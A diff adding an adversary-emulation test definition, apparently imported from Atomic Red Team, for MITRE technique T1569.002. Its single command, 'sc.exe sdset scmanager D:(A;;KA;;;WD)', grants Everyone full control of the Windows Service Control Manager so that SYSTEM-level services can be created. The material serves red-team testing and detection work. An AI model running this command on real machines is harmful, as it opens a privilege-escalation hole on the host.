@@ -1,0 +1,30 @@
+- id: bf07f520-3909-4ef5-aa22-877a50f2f77b
+  name: Modifying ACL of Service Control Manager via SDET
+  description: 'Modify permissions of Service Control Manager via SDSET. This allows
+    any administrative user to escalate privilege and create a service with SYSTEM
+    level privileges.Restart is required.
+
+    [Blog](https://0xv1n.github.io/posts/scmanager/)'
+  tactic: execution
+  technique:
+    attack_id: T1569.002
+    name: 'System Services: Service Execution'
+  platforms:
+    windows:
+      sh:
+        command: sc.exe sdset scmanager D:(A;;KA;;;WD)
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1569.002
+  - execution
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2020-03-10T18:33:36.159Z'
+    atomic_guid: bf07f520-3909-4ef5-aa22-877a50f2f77b
+    import_timestamp: '2025-06-24T11:15:03.516210Z'
